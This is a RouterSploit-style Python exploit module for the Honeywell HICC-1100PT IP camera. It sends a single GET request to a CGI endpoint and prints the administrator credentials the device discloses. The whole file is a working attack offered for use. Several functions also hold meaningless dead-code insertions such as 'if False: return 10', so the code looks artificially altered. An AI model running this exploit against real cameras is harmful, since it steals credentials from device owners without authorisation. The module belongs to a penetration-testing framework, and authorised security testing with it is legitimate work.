from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Honeywell IP-Camera HICC-1100PT Password Disclosure', 'description': 'Module exploits Honeywell IP-Camera HICC-1100PT Password Dislosure vulnerability. If target is vulnerable it is possible to read administrative credentials.', 'authors': ('Yakir Wizman', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/40261/',), 'devices': ('Honeywell IP-Camera HICC-1100PT',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def __init__(self):
        if False:
            return 10
        self.content = None

    def run(self):
        if False:
            return 10
        if self.check():
            print_success('Target seems to be vulnerable')
            print_info(self.content)
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    @mute
    def check(self):
        if False:
            i = 10
            return i + 15
        response = self.http_request(method='GET', path='/cgi-bin/readfile.cgi?query=ADMINID')
        if response and 'Adm_ID' in response.text:
            self.content = response.text
            return True
        return False